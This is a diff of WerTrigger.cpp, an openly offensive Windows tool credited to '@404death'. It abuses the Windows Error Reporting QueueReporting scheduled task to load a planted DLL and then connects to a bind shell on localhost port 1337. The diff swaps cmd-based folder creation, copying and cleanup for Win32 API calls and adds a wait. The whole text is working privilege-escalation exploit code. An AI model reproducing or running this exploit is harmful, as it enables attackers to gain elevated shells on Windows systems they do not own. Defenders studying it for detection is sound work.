@@ -1,11 +1,11 @@
-// WerTrigger.cpp : This file contains the 'main' function. Program execution begins and ends there.
+// WerTrigger.cpp : Windows Error Reporting Trigger by @404death !
 //
 #include <iostream>
 #include <strsafe.h>
 #include <tchar.h>
 #include "TcpClient.h"
 
-#define BUFSIZE 1024
+#define BUFSIZE 4096
 
 int wmain(int argc, wchar_t** argv)
 {
@@ -22,31 +22,15 @@ int wmain(int argc, wchar_t** argv)
 
 	wprintf_s(L"[+] Windows Error Reporting Trigger by @404death !\n");
 
-	// command line 1
-	WCHAR cmdLine1[BUFSIZE]; 
-	ZeroMemory(cmdLine1, BUFSIZE);
-	StringCchCat(cmdLine1, BUFSIZE, L"cmd /c mkdir C:\\ProgramData\\Microsoft\\Windows\\WER\\ReportQueue\\a_b_c_d_e > nul 2>&1");
+	CreateDirectoryW(L"c:\\programdata\\microsoft\\windows\\wer\\reportqueue\\a_b_c_d_e", NULL);
 
-	CreateProcess(nullptr, cmdLine1, nullptr, nullptr, FALSE, 0, nullptr, nullptr, &si, &pi);
-
-	CloseHandle(pi.hThread);
-	CloseHandle(pi.hProcess);
-
-	// command line 2
-	WCHAR cmdLine2[BUFSIZE]; //	
-	ZeroMemory(cmdLine2, BUFSIZE);
-	StringCchCat(cmdLine2, BUFSIZE, L"cmd /c copy Report.wer C:\\ProgramData\\Microsoft\\Windows\\WER\\ReportQueue\\a_b_c_d_e > nul 2>&1");
-
-	CreateProcess(nullptr, cmdLine2, nullptr, nullptr, FALSE, 0, nullptr, nullptr, &si, &pi);
-
-	CloseHandle(pi.hThread);
-	CloseHandle(pi.hProcess);
-
-	// submitting problem report cmd4
+	CopyFileW(L"Report.wer", L"c:\\programdata\\microsoft\\windows\\wer\\reportqueue\\a_b_c_d_e\\Report.wer", true);
+	
+	// submitting problem report with schtasks
 
 	WCHAR cmdLine4[BUFSIZE]; 
 	ZeroMemory(cmdLine4, BUFSIZE);
-	StringCchCat(cmdLine4, BUFSIZE, L"cmd /c schtasks /run /TN \"Microsoft\\Windows\\Windows Error Reporting\\QueueReporting\" > nul 2>&1");
+	StringCchCat(cmdLine4, BUFSIZE, L"cmd /c SCHTASKS /RUN /TN \"Microsoft\\Windows\\Windows Error Reporting\\QueueReporting\" > nul 2>&1");
 
 	CreateProcess(nullptr, cmdLine4, nullptr, nullptr, FALSE, 0, nullptr, nullptr, &si, &pi);
 
@@ -56,15 +40,9 @@ int wmain(int argc, wchar_t** argv)
 	Sleep(2000);
 
 	// clean dir
-	WCHAR cmdLine3[BUFSIZE]; 
-	ZeroMemory(cmdLine3, BUFSIZE);
-	StringCchCat(cmdLine3, BUFSIZE, L"cmd /c rmdir /s/q C:\\ProgramData\\Microsoft\\Windows\\WER\\ReportQueue\\a_b_c_d_e > nul 2>&1");
-
-	CreateProcess(nullptr, cmdLine3, nullptr, nullptr, FALSE, 0, nullptr, nullptr, &si, &pi);
-
-	CloseHandle(pi.hThread);
-	CloseHandle(pi.hProcess);
-
+	DeleteFileW(L"C:\\ProgramData\\Microsoft\\Windows\\WER\\ReportQueue\\a_b_c_d_e\\Report.wer");
+	RemoveDirectoryW(L"C:\\ProgramData\\Microsoft\\Windows\\WER\\ReportQueue\\a_b_c_d_e");
+	
 	// TCP connecting
 
 	TcpClient tcpClient;
@@ -77,6 +55,8 @@ int wmain(int argc, wchar_t** argv)
 	// Wait a bit before trying to connect to the bind shell.
 	//  
 	wprintf_s(L"[*] Waiting for the DLL to be loaded...\n");
+
+	Sleep(2000);
 
 	iRes = tcpClient.connectTCP("127.0.0.1", "1337");
 
